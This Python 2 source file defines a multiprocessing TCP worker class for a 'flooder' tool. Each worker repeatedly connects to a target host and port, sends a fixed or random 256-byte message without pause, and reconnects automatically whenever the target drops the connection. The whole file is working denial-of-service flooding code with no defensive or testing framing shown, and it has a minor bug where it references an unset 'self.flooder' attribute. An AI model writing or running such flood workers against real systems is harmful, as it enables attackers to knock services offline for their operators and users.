import socket, time
from Functions import *
from multiprocessing import Process

class TCPWorkerThread(Process):

    def __init__(self, flooder, id):
        Process.__init__(self)
        self.id = id
        self.socket = socket.socket()
        self.socket.setblocking(1)

        self.host = flooder.host
        self.port = flooder.port
        self.wait = flooder.wait
        self.running = True
        self.byteCount = 0

        if flooder.random:
            self.message = randomString(256)
        else:
            self.message = self.flooder.message

        print "initialized tcp thread"

    def stop(self):
        self.running = False

    def run(self):
        try:
            while self.running:
                while self.running:
                    try:
                        self.socket.connect((self.host, self.port))
                        #print "thread", self.id, "connected"
                        break
                    except Exception as e:
                        if e.args[0] == 106 or e.args[0] == 60:
                            break
                        #print "Couldn't connect:", e.args, self.host, self.port
                        time.sleep(1)
                        continue
                    break

                while self.running:
                    try:
                        bytes = self.socket.send(self.message)
                        self.byteCount += bytes
                        if self.wait:
                            time.sleep(1)
                    except Exception as e:
                        if e.args[0] == 32 or e.args[0] == 104:
                            #print "thread", self.id ,"connection broken, retrying."
                            self.socket = socket.socket()
                            break
                        #print "Couldn't send message on thread", self.id, "because", e.args
                        time.sleep(0.1)
                        pass
        except KeyboardInterrupt:
            return

    def __getstate__(self):
        odict = self.__dict__.copy()
        del odict['socket']
        return odict

    def __setstate__(self, dict):
        self.__dict__.update(dict)
        self.socket = socket.socket()
        self.socket.setblocking(1)
